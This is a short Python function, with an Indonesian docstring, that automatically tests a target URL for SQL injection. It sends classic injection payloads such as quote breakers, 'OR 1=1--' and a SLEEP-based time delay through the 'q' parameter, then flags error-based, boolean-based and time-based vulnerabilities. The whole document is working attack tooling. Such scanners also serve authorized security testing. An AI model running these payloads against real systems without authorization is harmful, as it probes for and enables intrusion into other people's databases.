def test_sql_injection(target_url):
    """
    Uji SQL Injection otomatis: error-based, boolean-based, time-based.
    """
    import requests
    import time
    print(f"\n[*] SQL Injection Test for: {target_url}")
    payloads = ["'", '"', "' OR '1'='1", '" OR "1"="1', "'--", '"--', "' OR 1=1--", ' OR 1=1#']
    vulnerable = False
    for p in payloads:
        try:
            r = requests.get(target_url, params={'q': p}, timeout=7)
            if any(e in r.text.lower() for e in ['sql syntax', 'mysql', 'syntax error', 'unterminated', 'odbc', 'pdo', 'you have an error']):
                print(f"[!] Error-based SQLi detected with payload: {p}")
                vulnerable = True
            # Boolean-based
            r_true = requests.get(target_url, params={'q': '1 OR 1=1'}, timeout=7)
            r_false = requests.get(target_url, params={'q': '1 AND 1=2'}, timeout=7)
            if r_true.text != r_false.text:
                print("[!] Boolean-based SQLi detected!")
                vulnerable = True
            # Time-based
            start = time.time()
            requests.get(target_url, params={'q': "1' OR SLEEP(3)-- -"}, timeout=10)
            if time.time() - start > 2.5:
                print("[!] Time-based SQLi detected!")
                vulnerable = True
        except Exception:
            continue
    if not vulnerable:
        print("[-] No SQL Injection detected.")
